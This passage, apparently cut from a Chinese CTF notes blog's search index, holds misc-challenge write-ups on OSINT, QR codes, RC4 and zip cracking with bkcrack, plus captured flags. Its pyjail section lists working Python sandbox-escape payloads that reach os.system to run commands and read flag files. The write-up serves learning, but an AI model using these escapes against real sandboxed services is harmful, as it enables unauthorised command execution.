\uff0c\u53ea\u662f\u52a0\u5bc6\u4e86\u3002\u5176\u4ed6\u4e24\u4e2a\u6587\u4ef6\u6ca1\u627e\u5230\u4ec0\u4e48\u5185\u5bb9\uff0c\u68c0\u67e5\u662f\u5426\u4f2a\u52a0\u5bc6\uff0c\u540c\u6837\u4e0d\u662f\u3002</p> <p>\u5176\u5b9e\u5728 binwalk \u5206\u79bb\u82b1\u8d39\u4e00\u4e9b\u65f6\u95f4\u65f6\uff0c\u6211\u4f1a\u770b\u4e0b\u6587\u4ef6\u5c5e\u6027\uff1b\u4f46\u662f\u6ca1\u53d1\u73b0\u4ec0\u4e48\u4e1c\u897f\uff0c\u76f4\u5230\u770b\u4e86\u4e0b\u8ba8\u8bba\u533a\u2026\u2026\u6211\u4ee5\u4e3a\u76f8\u673a\u578b\u53f7\u5c31\u662f\u8fd9\u6837\u5947\u602a\u5462\u2026\u202616 \u8fdb\u5236\u89e3\u7801\uff0c\u5f97 <code>ctf_NISA_2022</code>\uff0c\u8fd9\u5c31\u662f\u538b\u7f29\u5305\u5bc6\u7801\uff0c\u5f97\uff1a</p> <p>Flag</p> <p><code>NSSCTF {Nls@_FumYEnnOjy}</code></p> <ol> <li> <p>\u5176\u5b9e\u6709\u6211\u4eec\u4e5f\u4e0d\u80fd\u5168\u4fe1\u3002\u00a0\u21a9</p> </li> </ol>","tags":["notes","ctf"]},{"location":"CTF/NOTE/MISC/info_leak/","title":"Info leak","text":"","tags":["notes","ctf"]},{"location":"CTF/NOTE/MISC/info_leak/#litctf-2023","title":"LitCTF 2023","text":"","tags":["notes","ctf"]},{"location":"CTF/NOTE/MISC/info_leak/#_1","title":"\u5bfc\u5f39\u8ff7\u8e2a","text":"<p>\u6253\u5f00\u73af\u5883<sup>1</sup>\uff0c\u5c31\u662f\u4e00\u4e2a\u6e38\u620f\u3002</p> <ol> <li>\u5982\u679c\u901a\u5173\u5230 level6 \u786e\u5b9e\u662f\u53ef\u4ee5\u83b7\u53d6 flag \u7684\uff1b</li> <li>\u8be5\u6e38\u620f\u5168\u90e8\u653e\u5728\u524d\u7aef\uff0c\u901a\u5173\u7ed3\u679c\u4e5f\u5728\u524d\u7aef\uff0c\u67e5\u770b\u5230 src/game.js \u4e2d\u6709\u7ed3\u679c\u3002</li> </ol> <p>\u76f4\u63a5\u641c\u7d22 CTF\u3001flag \u7b49\u5173\u952e\u8bcd\u662f\u6ca1\u6709\u7684\uff0c\u56e0\u4e3a\u4f5c\u8005\u7528\u4e86 <code>F|L|A|G</code> \u5206\u5272\u3002 </p> <p>Flag</p> <p><code>NSSCTF{y0u_w1n_th1s_!!!}</code></p> <ol> <li> <p>\u7b2c\u4e00\u6b21\u6253\u5f00\u662f\u4e00\u4e2a\u9ed1\u5c4f\uff0c\u6211\u4ee5\u4e3a\u662f\u7279\u610f\u8bbe\u8ba1\u7684\uff1b\u8bd5\u4e86\u8bd5 robots.txt\uff0c\u610f\u5916\u7684\u6253\u5f00\u4e86\u2026\u2026\u00a0\u21a9</p> </li> </ol>","tags":["notes","ctf"]},{"location":"CTF/NOTE/MISC/osint/","title":"Osint","text":"","tags":["notes","ctf"]},{"location":"CTF/NOTE/MISC/osint/#geekgame2023","title":"GeekGame2023","text":"","tags":["notes","ctf"]},{"location":"CTF/NOTE/MISC/osint/#_1","title":"\u5c0f\u5317\u95ee\u7b54!!!!!","text":"<ul> <li>prob18-trivia</li> </ul>","tags":["notes","ctf"]},{"location":"CTF/NOTE/MISC/osint/#q1","title":"Q1","text":"<p>\u6839\u636e GPL \u8bb8\u53ef\u8bc1\u7684\u8981\u6c42\uff0c\u57fa\u4e8e Linux \u4e8c\u6b21\u5f00\u53d1\u7684\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u5fc5\u987b\u5f00\u6e90\u3002\u4f8b\u5982\u5c0f\u7c73\u516c\u53f8\u5f00\u6e90\u4e86 Redmi K60 Ultra \u624b\u673a\u7684\u5185\u6838\u3002\u5176\u5185\u6838\u7248\u672c\u53f7\u662f\uff1f</p> <p>\u9996\u5148\u53bb\u627e\u627e\u770b\uff0c\u53d1\u73b0 github \u4ed3\u5e93\uff0c\u81ea\u7136\u662f\u6700\u597d\u7684\uff1b\u8fdb\u5165\u540e\u641c\u7d22 Redmi K60 Ultra\uff0c\u5207\u6362\u5230 corot-s-oss \u5206\u652f\u3002</p> <p>\u5148\u770b README \u6587\u4ef6\uff0c\u65e0\uff1b\u57fa\u4e8e Linux kernel licensing rules \uff0c\u67e5\u770b Linux-syscall-note \uff0c\u4e5f\u6ca1\u6709\u7248\u672c\u4fe1\u606f\u3002</p> <p>devv_ai \u5bf9\u8bdd\u8bb0\u5f55 =&gt; Where do I find the version of a Linux kernel source tree?</p> <p>\u67e5\u770b MakeFile \uff0c\u7ed3\u5408 <code>^\\d+\\.\\d+\\.\\d+$</code> \u7684\u7b54\u6848\u683c\u5f0f =&gt; <code>5.15.78</code></p> <p>Extra</p> <p>\u76f4\u63a5\u4f7f\u7528\u7f51\u9875\u4e0a\u7aef\u7684\u641c\u7d22\u680f\uff0c\u53ea\u80fd\u591f\u641c\u7d22\u9ed8\u8ba4\u5206\u652f\uff0c\u800c\u6211\u4eec\u60f3\u8981\u641c\u7d22\u7279\u5b9a\u7684\u5206\u652f\u3002</p> <ul> <li>git clone \uff0c\u968f\u540e\u5728\u672c\u5730\u641c\u7d22 =&gt; \u7565\u9ebb\u70e6\uff0c\u4f46\u662f\u53ef\u4ee5\u4f7f\u7528\u547d\u4ee4\u884c</li> <li>\u5c06 url \u4e2d\u7684 <code>github.com</code> \u6539\u4e3a <code>github.dev</code> \uff08\u6216\u8005\u6309\u4e0b <code>.</code> \uff09\uff0c\u53ef\u4ee5\u5728\u5728\u7ebf\u7f16\u8f91\u5668\u4e2d\u6253\u5f00\uff1b\u4f46\u662f\u6b64\u65f6\u5de6\u4fa7\u7684\u641c\u7d22\u4f9d\u65e7\u4e0d\u80fd\u4f7f\u7528\uff08\u56e0\u4e3a\u53ea\u80fd\u591f\u641c\u7d22 \u6253\u5f00\u7684\u7f16\u8f91\u5668 \u90e8\u5206\uff09<ul> <li>\u4f7f\u7528\u9ad8\u7ea7\u641c\u7d22</li> </ul> </li> </ul>","tags":["notes","ctf"]},{"location":"CTF/NOTE/MISC/osint/#q2","title":"Q2","text":"<p>\u6bcf\u6b3e\u82f9\u679c\u4ea7\u54c1\u90fd\u6709\u4e00\u4e2a\u5185\u90e8\u7684\u8bc6\u522b\u540d\u79f0\uff08Identifier\uff09\uff0c\u4f8b\u5982\u521d\u4ee3 iPhone \u662f iPhone1,1\u3002\u90a3\u4e48 Apple Watch Series 8\uff08\u8702\u7a9d\u7248\u672c\uff0c41mm \u5c3a\u5bf8\uff09\u662f\u4ec0\u4e48\uff1f</p> <p>\u67e5\u8be2\u7684\u5730\u70b9\u633a\u591a\u7684\uff1a</p> <ul> <li>\u6211\u641c\u7684\uff1aeverymac =&gt; Watch6,16</li> <li>\u5b98\u65b9\u9898\u89e3\uff1aappledb =&gt; Watch6,16 \uff08\u751a\u81f3\u5728 url \u4e2d\u5c31\u7528\u7684\u662f identifier\uff09</li> </ul>","tags":["notes","ctf"]},{"location":"CTF/NOTE/MISC/osint/#q3","title":"Q3","text":"<p>\u672c\u5c4a PKU GeekGame \u7684\u6bd4\u8d5b\u5e73\u53f0\u4f1a\u7981\u6b62\u9009\u624b\u6635\u79f0\u4e2d\u5305\u542b\u67d0\u4e9b\u7279\u6b8a\u5b57\u7b26\u3002\u622a\u6b62\u5230 2023 \u5e74 10 \u6708 1 \u65e5\uff0c\u5171\u7981\u6b62\u4e86\u591a\u5c11\u4e2a\u5b57\u7b26\uff1f\uff08\u63d0\u793a\uff1a\u672c\u9898\u7b54\u6848\u4e0e Python \u7248\u672c\u6709\u5173\uff0c\u4ee5\u5e73\u53f0\u5b9e\u9645\u8fd0\u884c\u60c5\u51b5\u4e3a\u51c6\uff09</p> <p>\u6839\u636e\u5728 github \u4e0a\u7684\u8d26\u53f7\u627e\u5230\u6bd4\u8d5b\u5e73\u53f0\u540e\u7aef\uff0c\u641c\u7d22\u201cnickname\u201d \u6216\u8005 \u201c\u6635\u79f0\u201d <sup>1</sup>\uff0c\u67e5\u770b <code>cls.DISALLOWED_CHARS</code> \u3002</p> <p>\u4e5f\u5c31\u662f\u8bf4\uff0c\u6211\u4eec\u9700\u8981 <code>len(WHITESPACE)</code> \uff0c\u5c06\u5b83\u590d\u5236\u4e0b\u6765\u8fd0\u884c\u597d\u4e86\uff1a</p> test.py<pre><code>from typing import TYPE_CHECKING, Optional, Set\nfrom unicategories import categories\nimport sys\n\n\ndef unicode_chars(*cats: str) -&gt; Set[str]:\n    ret = set()\n    for cat in cats:\n        ret |= set(categories[cat].characters())\n    return ret\n\n\nEMOJI_CHARS = (\n    {chr(0x200D)}  # zwj\n    | {chr(0x200B)}  # zwsp, to break emoji componenets into independent chars\n    | {chr(0x20E3)}  # keycap\n    | {chr(c) for c in range(0xFE00, 0xFE0F + 1)}  # variation selector\n    | {chr(c) for c in range(0xE0020, 0xE007F + 1)}  # tag\n    | {chr(c) for c in range(0x1F1E6, 0x1F1FF + 1)}  # regional indicator\n)\n# https://www.compart.com/en/unicode/category\nDISALLOWED_CHARS = (\n    unicode_chars(\n        \"Cc\", \"Cf\", \"Cs\", \"Mc\", \"Me\", \"Mn\", \"Zl\", \"Zp\"\n    )  # control and modifier chars\n    | {chr(c) for c in range(0x12423, 0x12431 + 1)}  # too long\n    | {chr(0x0D78)}  # too long\n) - EMOJI_CHARS\n\nprint(sys.version)\nprint(len(DISALLOWED_CHARS))\n</code></pre> <p>\u63d0\u793a\u4e0e\u5b9e\u9645 python \u7248\u672c\u6709\u5173\uff0c\u5c1d\u8bd5\u5bfb\u627e\u4fe1\u606f =&gt; <code>python &gt;= 3.8</code> \uff0c\u6211\u4eec\u628a 3.8/3.9/3.10/3.11/3.12 \u90fd\u8bd5\u8bd5\u597d\u4e86\u3002</p> <p>Note</p> <p>\u5728\u7ebf\u8fd0\u884c\u7684\u7f51\u7ad9\u6ca1\u627e\u5230\u80fd\u591f\uff0c\u5e72\u8106\u7528 conda \u5404\u4e2a\u7248\u672c\u521b\u5efa\u4e00\u4e2a\u6d4b\u8bd5\u73af\u5883\uff0c\u7ed3\u679c\u5206\u522b\u5982\u4e0b\uff1a</p> <ul> <li>3.8.20 =&gt; <code>4445</code></li> <li>3.9.20/3.10.15 =&gt; <code>4472</code></li> <li>3.11.10 =&gt; <code>4587</code></li> <li>3.12.7 =&gt; <code>4636</code></li> </ul>","tags":["notes","ctf"]},{"location":"CTF/NOTE/MISC/osint/#q4","title":"Q4","text":"<p>\u5728 2011 \u5e74 1 \u6708\uff0cBilibili \u6e38\u620f\u533a\u4e0b\u5171\u6709\u54ea\u4e9b\u5b50\u5206\u533a\uff1f\uff08\u6309\u7f51\u7ad9\u663e\u793a\u987a\u5e8f\uff0c\u4ee5\u534a\u89d2\u9017\u53f7\u5206\u9694\uff09</p> <p>\u8fd9\u4e2a\u771f\u627e\u4e0d\u5230\uff0c\u672c\u4ee5\u4e3a\u592a\u53e4\u8001\u4e86\uff0c\u4e0d\u8fc7\u662f\u786e\u5b9e\u4e0d\u77e5\u9053 web archive\uff1b\u8fd8\u8981\u77e5\u9053\u4ee5\u524d bilibili \u662f https://bilibili.us \uff08\u54c7\u54e6\uff09=&gt; <code>\u6e38\u620f\u89c6\u9891,\u6e38\u620f\u653b\u7565\u00b7\u89e3\u8bf4,Mugen,flash\u6e38\u620f</code></p> <ol> <li> <p>\u53ef\u4ee5\u5148\u53bb\u5e73\u53f0\u6ce8\u518c\u4e00\u4e2a\u65b0\u53f7\uff0c\u6545\u610f\u53d6\u4e9b\u4e71\u4e03\u516b\u7cdf\u7684\u540d\u5b57\uff0c\u770b\u770b\u56de\u663e\u00a0\u21a9</p> </li> </ol>","tags":["notes","ctf"]},{"location":"CTF/NOTE/MISC/pyjail/","title":"Pyjail","text":"<p>Prerequisite</p> <p>\u51c6\u5907\u7ec3\u7ec3 python jail \uff0c\u51c6\u5907\u8d44\u6599\u5982\u4e0b\uff1a</p> <ul> <li>Tr0y's Blog<ul> <li>Python \u6c99\u7bb1\u9003\u9038\u7684\u7ecf\u9a8c\u603b\u7ed3</li> <li>Python \u6c99\u7bb1\u9003\u9038\u7684\u901a\u89e3\u63a2\u7d22\u4e4b\u8def</li> <li>Unicode \u7684\u4f7f\u7528</li> </ul> </li> <li>nssctf (\u641c jail \u5373\u53ef)<ul> <li>\u4e00\u4e2a\u7b80\u5355\u7684\u9898\u89e3</li> </ul> </li> <li>github-autojail</li> <li>moectf2024 \u9898\u76ee\u94fe\u63a5</li> </ul> <ul> <li> <p>Moejail</p> </li> <li> <p><code>__import__('os').system('ls')</code></p> </li> <li><code>[i.__init__.__globals__['linecache'].__dict__['os'].system('whoami') for i in ''.__class__.__mro__[-1].__subclasses__() if i.__name__ == \"catch_warnings\"]</code></li> <li><code>[i for i in ''.__class__.__mro__[-1].__subclasses__() if i.__name__ == \"_wrap_close\"][0].__init__.__globals__['system']('cat ./flag')</code></li> <li>\u9650\u5236 A-z0-9 =&gt; https://lingojam.com/ItalicTextGenerator</li> <li>\u9650\u5236 <code>'\"{}[]()_</code> =&gt; <code>@exec\\n@input\\nclass\\tx:\\n\\tpass</code></li> </ul> <pre><code>@exec\n@input\nclass x:\n    pass\n\nexec(\"@exec\\n@input\\nclass\\tx:\\n\\tpass\")\n# exec(\"@\ud835\ude26\ud835\ude39\ud835\ude26\ud835\ude24\\n@\ud835\ude2a\ud835\ude2f\ud835\ude31\ud835\ude36\ud835\ude35\\n\ud835\ude24\ud835\ude2d\ud835\ude22\ud835\ude34\ud835\ude34\\t\ud835\ude39:\\n\\t\ud835\ude31\ud835\ude22\ud835\ude34\ud835\ude34\")\n</code></pre>","tags":["notes","ctf"]},{"location":"CTF/NOTE/MISC/qrcode/","title":"Qrcode","text":"<p>misc \u5f80\u5f80\u9700\u8981\u591a\u5c42\u5904\u7406\uff0c\u4ee5 qrcode \u5f00\u5934\u7684\u90fd\u653e\u8fd9\u5427\u3002</p> <p>\u66b4\u529b\u7834\u89e3\u83b7\u5f97\u5bc6\u7801\uff1a<code>1tcKm</code> \uff0c\u83b7\u5f97 flag \uff1a</p> <p>Flag</p> <p>NSSCTF{h@ck-Z3r0}</p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/MISC/qrcode/#nisactf-2022","title":"NISACTF 2022","text":"","tags":["notes","ctf"]},{"location":"CTF/NOTE/MISC/qrcode/#bilala","title":"bilala\u7684\u4e8c\u7ef4\u7801","text":"<p>\u62ff\u5230\u9644\u4ef6\uff0c\u663e\u7136\u7f3a\u5c11\u4e86\u5b9a\u4f4d\u89d2\uff0c\u4f7f\u7528 \u4e00\u4e9b\u5de5\u5177\u8865\u5168 \u4e8c\u7ef4\u7801\uff0c\u626b\u63cf\u5f97\u5230\u4e00\u5f20\u56fe\u7247\uff0c\u6211\u59d1\u4e14\u547d\u540d\u4e3a balabala.jpg\uff0c\u7136\u540e binwalk \u68c0\u67e5\uff0c\u5206\u79bb\uff0c\u770b\u5f97\u51fa\u6765\u662f morse.mp3 \u8981\u5bc6\u7801\u3002</p> <p>\u63a5\u4e0b\u6765\u96be\u8bc4\uff0c\u5168\u9760\u731c\u4e86\uff0c\u538b\u7f29\u5305\u5bc6\u7801\u4e3a <code>NISA</code>\uff08\u8fd9\u4e48\u957f\u5f53\u7136\u4e5f\u53ef\u4ee5\u76f4\u63a5\u7206\u7834\uff0c\u4f46\u662f\u4e0d\u77e5\u9053\u5927\u5c0f\u5199/\u6709\u65e0\u6570\u5b57\uff0c\u8fd8\u662f\u8981\u4e00\u6bb5\u65f6\u95f4\u7684\uff09\uff1b\u7136\u540e\u5c31\u662f\u7ecf\u5178\u7684\u97f3\u9891\u6469\u65af\u5bc6\u7801\uff0c\u8fd9\u91cc\u6709\u4e2a\u81ea\u52a8\u6b3e\uff1b\u89e3\u51fa <code>PART 1: M0RS34ND</code>\uff1b\u7136\u540e\u52a0\u4e0a\u7684\u662f binwalk \u5206\u79bb\u51fa\u6765\u7684\u7b2c\u4e8c\u7ae0\u56fe\u7247\u7684\u50cf\u7d20\u4e4b\u6bd4 <code>282X231</code> (\u6709\u70b9\u82e5\u53ea)\u3002</p> <p>Flag</p> <p>NSSCTF{M0RS34ND282X231}</p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/MISC/qrcode/#hnctf-2022-week2","title":"HNCTF 2022 WEEK2","text":"","tags":["notes","ctf"]},{"location":"CTF/NOTE/MISC/qrcode/#_1","title":"\u626b\u4e0d\u51fa\u6765\u7684\u4e8c\u7ef4\u7801","text":"<p>\u626b\u4e0d\u51fa\u6765\uff0c\u4f46\u662f\u6211\u626b\u4e86\u5374\u51fa\u6765\u4e86\ud83d\ude05\uff0c\u4e0b\u8f7d\u5f97\u5230 pdf\uff0c\u4f46\u662f\u6253\u4e0d\u5f00\uff0c<code>file</code> \u7167\u5996\u955c\uff1a</p> <p></p> <p>\u6539\u4e3a zip\uff0c\u5f97\u5230 <code>\u6b63\u5982\u8ba1\u7b97\u673a\u91cc\u53ea\u6709 0 \u548c 1.png</code> \u3002</p> <p>\u540c\u6837\u7684\u65b9\u5f0f\uff0c\u7528 file\u3001binwalk\u3001steghide \u90fd\u68c0\u67e5\u4e86\uff0c\u6ca1\u53d1\u73b0\u95ee\u9898\u2026\u2026</p> <p>\u4e8e\u662f\u6254\u7ed9 AI\uff0c\u5c45\u7136\u4e5f\u662f\u4e00\u79cd\u4e8c\u7ef4\u7801\uff01\u4e3a Maxicode\uff0c\u53ef\u4ee5\u7528\u5728\u7ebf\u5de5\u5177 \u5f88\u5feb\u626b\u51fa\u6765\uff0cbasee64 \u89e3\u7801\uff1a</p> <p>Flag</p> <p>nssctf{I_h0te_the_QRc0de!!!!}</p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/MISC/qrcode/#swpu-2019","title":"[SWPU 2019]\u795e\u5947\u7684\u4e8c\u7ef4\u7801","text":"<p>\u9898\u76ee \u53c2\u8003\u9898\u89e3</p> <p>\u62ff\u5230\u4e00\u5f20\u56fe\u7247\uff0c\u4f60\u53ef\u80fd\u6709\u5f88\u591a\u60f3\u6cd5\uff1b\u6211\u4eec\u5148\u7528 binwalk \u626b\u63cf \uff0c\u53d1\u73b0\u51e0\u4e2a rar\uff0cbinwalk \u5206\u89e3\u540e\uff0c\u5206\u522b\u5c1d\u8bd5\u6253\u5f00\uff1a</p> <p></p> <p>base64 \u89e3\u7801\u5f97 <code>asdfghjkl1234567890</code> \uff0c\u5e94\u8be5\u662f\u4e00\u4e2a\u5bc6\u7801\uff1b\u8df3\u8fc7\u4e2d\u95f4\u6ca1\u5565\u610f\u4e49\u7684\u538b\u7f29\u5305\uff0c\u6211\u4eec\u770b\u5230 flag.doc \u4e2d\u663e\u7136\u662f base64 \u7684\u7f16\u7801\uff08\u53ea\u6709 a-zA-Z0-9\uff09\uff0c\u4f7f\u7528 cyberchef base64 \u89e3\u7801\uff08\u8fde\u7eed\u89e3\u7801 20 \u6b21\uff0c\u989d\uff09\uff0c\u83b7\u5f97\u4e86 <code>comEON_YOuAreSOSoS0great</code> \uff0c\u8fd9\u662f\u6700\u540e\u4e00\u4e2a\u538b\u7f29\u5305\u7684\u5bc6\u7801\u3002</p> <p>\u6253\u5f00 good.mp3 \uff0c\u4e00\u542c\u5c31\u662f\u53d1\u7535\u62a5\ud83d\ude02\uff0c\u4f7f\u7528 audicity \u6216\u8005\u5176\u4ed6\u4f60\u559c\u6b22\u7684\u5de5\u5177\u6253\u5f00\uff0c\u5bbd\u8005\u4e3a <code>-</code> \uff0c\u7a84\u8005\u4e3a <code>.</code> \uff0c\u8fdb\u884c\u83ab\u65af\u89e3\u7801\uff08\u5bf9\u4e8e\u53ea\u6709\u4e09\u79cd\u5b57\u7b26\u7684\u60c5\u51b5\uff0c\u5f88\u53ef\u80fd\u662f\u83ab\u65af\u5bc6\u7801\uff09\uff1a</p> <p></p> <p>\u9898\u76ee\u8981\u6c42\u5c0f\u5199\uff1a</p> <p>Flag</p> <p>NSSCTF{morseisveryveryeasy}</p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/MISC/zip_rar/","title":"Zip rar","text":"","tags":["notes","ctf"]},{"location":"CTF/NOTE/MISC/zip_rar/#geekgame-3rd","title":"Geekgame-3rd","text":"<ul> <li>prob24</li> </ul> <p>\u62ff\u5230\u4e24\u4e2a\u538b\u7f29\u5305\uff0c\u68c0\u67e5\u4e0d\u662f\u4f2a\u52a0\u5bc6\u540e\uff0c\u4ece\u538b\u7f29\u5305\u5165\u624b\u3002</p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/MISC/zip_rar/#challenge-1","title":"challenge 1","text":"<p>\u5728 challenge_1.zip \u4e2d\uff0c\u53d1\u73b0\u6709 <code>chromedriver_linux64.zip</code> \uff0c\u8fd9\u4e2a\u6587\u4ef6\u5f88\u53ef\u80fd\u662f\u516c\u5f00\u7684\uff1b\u80fd\u591f\u83b7\u53d6\u538b\u7f29\u5305\u5185\u7684\u90e8\u5206\u6587\u4ef6\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u4f7f\u7528\u660e\u6587\u653b\u51fb\uff0c\u4f7f\u7528 bkcrack \u3002</p> <p>\u9996\u5148\u6211\u4eec\u6765\u770b\u8fd9\u4e2a\u538b\u7f29\u5305\u7684 \u539f\u59cb\u5927\u5c0f \u4e3a 5845152\uff08\u5b57\u8282\uff1f\uff09\uff0c\u8fd9\u53ef\u4ee5\u901a\u8fc7 <code>bkcrack -L</code> \u547d\u4ee4\u67e5\u770b\uff0c\u6216\u8005\u90e8\u5206\u538b\u7f29\u8f6f\u4ef6\u652f\u6301\u663e\u793a\u3002</p> <p>\u63a5\u7740\u6211\u4eec\u53bb\u641c\u7d22\u4e00\u4e0b\uff0c\u5728\u8fd9\u91cc\u4f9d\u636e\u6587\u4ef6\u5927\u5c0f\u641c\u7d22\u5230\u6211\u4eec\u9700\u8981\u7684\u7248\u672c\u4e3a <code>89.0.4389.23/chromedriver_linux64.zip</code> \uff0c\u6545\u800c\u4e0b\u8f7d\u5373\u53ef\u3002</p> <p>\u6709\u4e86\u660e\u6587\uff0c\u5982\u4e0b\u653b\u51fb\u5f97\u5230 challenge_1_d.zip:</p> <p></p> <p>\u4f7f\u7528\u7a7a\u5bc6\u7801\u89e3\u538b challenge_1_d.zip \u83b7\u53d6 flag.txt:</p> <p>Flag</p> <p>flag{insecure_zip_crypto_using_known_file_content}</p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/MISC/zip_rar/#challenge-2","title":"challenge 2","text":"<p>\u8fd8\u6709\u4e00\u4e2a\u538b\u7f29\u5305\u5462\uff0c\u53ea\u6709\u4e00\u4e2a\u6587\u4ef6\uff0c\u600e\u4e48\u529e\uff1f\u901a\u8fc7\u6269\u5c55\u540d\u63a8\u6d4b\u660e\u6587\u3002\u5728 pacpng \u4e2d\u6211\u4eec\u4e86\u89e3\u5230 panpng \u6587\u4ef6\u7684 Section Header Block (SHB) \u6709\u5176\u56fa\u5b9a\u7684\u683c\u5f0f\uff1a</p> <pre><code>0a 0d 0d 0a 8c 00 00 00 4d 3c 2b 1a 01 00 00 00  | ........M&lt;+.....\nff ff ff ff ff ff ff ff 03 00 2d 00 4d 61 63 20  | ..........-.Mac \n4f 53 20 58 20 31 30 2e 31 30 2e 34 2c 20 62 75  | OS X 10.10.4, bu\n69 6c 64 20 31 34 45 34 36 20 28 44 61 72 77 69  | ild 14E46 (Darwi\n6e 20 31 34 2e 34 2e 30 29 00 00 00 04 00 34 00  | n 14.4.0).....4.\n44 75 6d 70 63 61 70 20 31 2e 31 32 2e 36 20 28  | Dumpcap 1.12.6 (\n76 31 2e 31 32 2e 36 2d 30 2d 67 65 65 31 66 63  | v1.12.6-0-gee1fc\n65 36 20 66 72 6f 6d 20 6d 61 73 74 65 72 2d 31  | e6 from master-1\n2e 31 32 29 00 00 00 00 8c 00 00 00              | .12)........\n</code></pre> <p><code>0a 0d 0d 0a __ __ __ __ 4d 3c 2b 1a 01 00 00 00</code> \u5904\u683c\u5f0f\u6bd4\u8f83\u4e00\u81f4\uff0c\u5171\u6709 14 \u4e2a bytes \uff0c\u53ef\u4ee5\u76f4\u63a5\u7528 <code>bkcrack -C challenge_2.zip -c flag2.pcapng -p pcap_header.bin -o 6 -x 0 0a0d0d0a -U challenge_2_d.zip \"\"</code> \u7206\u7834\u3002</p> <p>\u7206\u7834\u82b1\u4e86\u5927\u698215\u5206\u949f\uff1b\u6bd4\u7279\u6d41\u8981\u7528\u4e8c\u8fdb\u5236\u5f62\u5f0f\u5199\u5165\uff01\u4e0d\u7136\u548c\u6211\u4e00\u6837\u8bd5\u4e86\u534a\u5929\u4e0d\u77e5\u9053\u4e3a\u5565\u51fa\u4e0d\u6765\uff1b\u968f\u4fbf\u5199\u4e2a python \u5199\u5165\u597d\u4e86\uff1a</p> <pre><code># \u5b9a\u4e49\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32\nhex_string = \"00004d3c2b1a01000000\"\n\n# \u5c06\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u5b57\u8282\nbinary_data = bytes.fromhex(hex_string)\n\n# \u5c06\u5b57\u8282\u5199\u5165\u6587\u4ef6\nwith open(\"pcap_header.bin\", \"wb\") as f:\n    f.write(binary_data)\n\nprint(\"\u6570\u636e\u5df2\u6210\u529f\u5199\u5165 pcap_header.bin\")\n</code></pre> <p>\u5728\u8fd9\u91cc\u63d0\u5230\uff0c\u6211\u4eec\u6293\u5305\u7684\u65f6\u5019\u662f\u4e0d\u77e5\u9053\u5b9e\u9645\u5bb9\u91cf\u662f\u591a\u5c11\u7684\uff0c\u6240\u4ee5\u6293\u5305\u7684\u65f6\u5019\u901a\u5e38\u76f4\u63a5\u8bbe\u7f6e\u8282\u957f\u5ea6\u4e3a <code>0xffffffffffffffff</code> \uff0c\u6211\u4eec\u53ef\u4ee5\u5148\u52a0\u4e0a\u8fd9\u4e2a\u8fdb\u884c\u5c1d\u8bd5\u6765\u51cf\u5c11\u7206\u7834\u65f6\u95f4\u3002</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u65f6\u95f4\u51cf\u5c11\u5230\u4e0d\u5230 4 \u5206\u949f\u4e86\uff0c\u4e0d\u59a8\u5148\u5927\u80c6\u8bd5\u8bd5\u3002</p> <p>\u6700\u540e\u5728\u6d41\u91cf\u4e2d\u627e\u627e\u5c31\u597d\u4e86</p> <p>Flag</p> <p>flag{inSecUrE-zip-CrYPTO-eVeN-withOuT-KNOWN-file-CoNtENT]</p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/MISC/zip_rar/#swpu-2020","title":"SWPU 2020","text":"","tags":["notes","ctf"]},{"location":"CTF/NOTE/MISC/zip_rar/#_1","title":"\u5957\u5a03","text":"<ul> <li>nssctf</li> </ul> <p>\u8d77\u521d\u83b7\u5f97\u4e00\u4e2a \u201c\u5957\u5a03.xls\u201d \uff0c\u5229\u7528 <code>file</code> \u547d\u4ee4\u83b7\u5f97\u662f zip \u6587\u4ef6\uff0c\u6539\u6269\u5c55\u540d\u89e3\u538b\uff0c\u91cd\u590d\u4e00\u6b21\u540e\u83b7\u5f97 RC4data.txt\uff08\u5185\u5bb9\u4e3a\"U2FsdGVkX19uI2lzmxYrQ9mc16y7la7qc7VTS8gLaUKa49gzXPclxRXVsRJxWz/p\"\uff09RC4key.zip\uff08\u52a0\u5bc6\uff09 + esayrc4.xlsx\uff08\u65e0\u6cd5\u6253\u5f00\uff0c\u4fee\u6539\u4e3a zip \u540e\u540c\u6837\u65e0\u6cd5\u6253\u5f00\uff09\u3002\u540d\u5b57\u63d0\u793a\u7684\u8fd9\u4e48\u591a\u4e86\uff0c\u4e86\u89e3\u4e00\u4e0b RC4\uff0c\u5f97\u77e5\u6211\u4eec\u9700\u8981\u5bc6\u94a5/\u5bc6\u94a5\u6d41\u3001\u5bc6\u6587\u5c31\u53ef\u4ee5\u5f97\u5230\u660e\u6587\u3002</p> <p>\u4f7f\u7528 010 \u67e5\u770b\u6587\u4ef6\uff0c\u5728 esayrc4.xlsx \u672b\u5c3e\u53d1\u73b0\u4e86\u5bc6\u94a5 \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\" \uff0c\u653e\u5165 \u5728\u7ebfrc4\u7f51\u7ad9\u89e3\u5bc6<sup>1</sup>\u3002</p> <p>Flag</p> <p>NSSCTF{ef1a73d40977a49b99b871980f355757}</p> <ol> <li> <p>\u8fd9\u4e2a\u7f51\u7ad9\u662f\u6211\u5728\u672c\u9898\u7684\u8ba8\u8bba\u533a\u5f97\u77e5\u7684\uff0c\u5176\u4ed6\u7f51\u7ad9\u5982\u679c\u8981\u6c42\u8bbe\u7f6e\u7f16\u7801\u683c\u5f0f\uff0c\u89e3\u4e0d\u51fa\u6765\uff08\u6216\u8005\u53ea\u662f\u6ca1\u627e\u5bf9\uff09\uff0c\u5c31\u6bd4\u8f83\u96be\u7ef7\u3002\u00a0\u21a9</p> </li> </ol>","tags":["notes","ctf"]},{"location":"CTF/NOTE/WEB/","title":"Web","text":"[web]          <ul> <li> Flow_analysis  544  2 mins              1739718485 </li> </ul>"},{"location":"CTF/NOTE/WEB/Flow_analysis/","title":"Flow analysis","text":"<p>misc \u4e2d\u7684\u6d41\u91cf\u5206\u6790 writeup \u3002</p> <ul> <li>\u5e38\u89c1\u7f51\u7ad9\u8ba4\u8bc1\u5f62\u5f0f</li> 